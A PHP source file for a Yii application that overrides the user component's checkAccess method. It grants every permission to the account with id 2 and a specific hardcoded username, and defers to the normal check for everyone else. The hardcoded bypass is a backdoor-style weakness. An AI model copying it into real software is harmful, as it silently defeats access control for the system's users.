<?php

namespace common\components;

class User extends \yii\web\User 
{
   public $identityClass = '\common\models\User';

   //login
   public function checkAccess($operation, $params = [], $allowCaching = true) {
    // Always return true when SuperAdmin user
    if (
        \Yii::$app->user->id == 2 && \Yii::$app->user->username == 'super6002041620047' 
    ) {
        return true;
    }
    return parent::can($operation, $params, $allowCaching);
    }
}
